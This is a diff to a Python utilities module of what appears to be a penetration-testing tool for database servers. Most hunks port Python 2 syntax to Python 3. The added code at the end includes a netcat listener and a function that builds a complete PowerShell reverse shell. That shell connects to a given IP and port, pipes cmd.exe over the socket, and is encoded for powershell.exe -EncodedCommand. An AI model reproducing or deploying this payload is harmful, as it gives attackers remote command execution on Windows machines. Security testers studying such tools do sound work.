@@ -6,6 +6,8 @@ from datetime import datetime
 import logging, os, random
 from socket import gethostbyname
 from socket import inet_aton
+import subprocess
+import base64
 
 def cleanString(strg):
 	'''
@@ -45,7 +47,7 @@ def databaseHasBeenGiven(args):
 	Otherwise return False
 	- args must be a dictionnary
 	'''
-	if args.has_key('database') == False or args['database'] == None:
+	if ('database' in args) == False or args['database'] == None:
 		logging.critical("The database must be given thanks to the '-d DATABASE' option.")
 		return False
 	return True
@@ -56,17 +58,17 @@ def ipOrNameServerHasBeenGiven(args):
 	Otherwise return False
 	- args must be a dictionnary
 	'''
-	if args.has_key('host') == False or args['host'] == None:
+	if ('host' in args) == False or args['host'] == None:
 		logging.critical("The server addess must be given thanks to the '-s IPadress' option.")
 		return False
 	else :
 		try:
 			inet_aton(args['host'])
-		except Exception,e:
+		except Exception as e:
 			try:
 				ip = gethostbyname(args['host'])
 				args['host'] = ip
-			except Exception,e:
+			except Exception as e:
 				logging.critical("There is an error with the name server or ip address: '{0}'".format(e))
 				return False
 	return True
@@ -97,9 +99,9 @@ def anOperationHasBeenChosen(args, operations):
 	- oeprations must be a list
 	- args must be a dictionnary
 	'''
-	if args.has_key('test-module')==True and args['test-module'] == True : return True
+	if ('test-module' in args)==True and args['test-module'] == True : return True
 	for key in operations:
-		if args.has_key(key) == True:
+		if (key in args) == True:
 			if args[key] != None and args[key] != False : return True
 	logging.critical("An operation on this module must be chosen thanks to one of these options: --{0};".format(', --'.join(operations)))
 	return False
@@ -156,8 +158,8 @@ def getScreenSize ():
 	'''
 	Returns screen size (columns, lines)
 	'''
-	rows, columns = os.popen('stty size', 'r').read().split()
-	return (rows, columns)
+	columns, rows  = os.popen('stty size', 'r').read().split()
+	return (int(rows), int(columns))
 	
 def getCredentialsFormated(dico):
 	'''
@@ -167,3 +169,32 @@ def getCredentialsFormated(dico):
 	stringV = "\n"
 	for aLogin in dico: stringV += "{0}/{1}\n".format(aLogin, dico[aLogin])
 	return stringV
+
+
+def runListenNC(port):
+	'''
+	nc listen on the port
+	'''
+	NC_CMD = "nc -l  -n -v {0}"  # {0} port #-n numeric-only IP addresses, no DNS
+	ncCmd = NC_CMD.format(port)
+	try :
+		logging.info('Listening for a remote connection on the local port {0} with the command "{1}"'.format(port, ncCmd))
+		subprocess.call(ncCmd, shell=True)
+	except KeyboardInterrupt:
+		logging.info("Connection closed locally")
+		pass
+
+def getPSReverseShellCodeEncoded(ip, port):
+	'''
+	Return the Powershell Reverse shell code. Reverse shell will connect to ip and port. nc listening is required
+	for getting connection back. Return encoded with utf16-LE + base64
+	'''
+	R_SHELL_COMMAND_POWERSHELL = "powershell.exe -EncodedCommand {0}"  # {0} powershell code base64 encoded
+	R_SHELL_COMMAND_POWERSHELL_PAYLOAD = 'function ReverseShellClean {{if ($c.Connected -eq $true) {{$c.Close()}}; if ($p.ExitCode -ne $null) {{$p.Close()}}; exit; }};$a="{0}"; $port="{1}";$c=New-Object system.net.sockets.tcpclient;$c.connect($a,$port) ;$s=$c.GetStream();$nb=New-Object System.Byte[] $c.ReceiveBufferSize;$p=New-Object System.Diagnostics.Process ;$p.StartInfo.FileName="cmd.exe" ;$p.StartInfo.RedirectStandardInput=1 ;$p.StartInfo.RedirectStandardOutput=1;$p.StartInfo.UseShellExecute=0;$p.Start();$is=$p.StandardInput;$os=$p.StandardOutput;Start-Sleep 1;$e=new-object System.Text.AsciiEncoding;while($os.Peek() -ne -1){{$out += $e.GetString($os.Read())}} $s.Write($e.GetBytes($out),0,$out.Length);$out=$null;$done=$false;while (-not $done) {{if ($c.Connected -ne $true) {{cleanup}} $pos=0;$i=1; while (($i -gt 0) -and ($pos -lt $nb.Length)) {{ $read=$s.Read($nb,$pos,$nb.Length - $pos); $pos+=$read;if ($pos -and ($nb[0..$($pos-1)] -contains 10)) {{break}}}}  if ($pos -gt 0){{ $string=$e.GetString($nb,0,$pos); $is.write($string); start-sleep 1; if ($p.ExitCode -ne $null) {{ReverseShellClean}} else {{  $out=$e.GetString($os.Read());while($os.Peek() -ne -1){{ $out += $e.GetString($os.Read());if ($out -eq $string) {{$out=" "}}}}  $s.Write($e.GetBytes($out),0,$out.length); $out=$null; $string=$null}}}} else {{ReverseShellClean}}}};'  # {0} IP, {1} port
+	payload = R_SHELL_COMMAND_POWERSHELL_PAYLOAD.format(ip, port)
+	logging.debug("payload: {0}".format(repr(payload)))
+	utf16LEPayloadBytes = payload.encode('UTF-16LE')
+	logging.debug("Payload encoded with UTF16-LE: {0}".format(repr(utf16LEPayloadBytes)))
+	cmdAndPayloadBytes = R_SHELL_COMMAND_POWERSHELL.format(base64.b64encode(utf16LEPayloadBytes).decode('ascii'))
+	logging.debug("Full Powershell Command (encoded): {0}".format(repr(cmdAndPayloadBytes)))
+	return cmdAndPayloadBytes
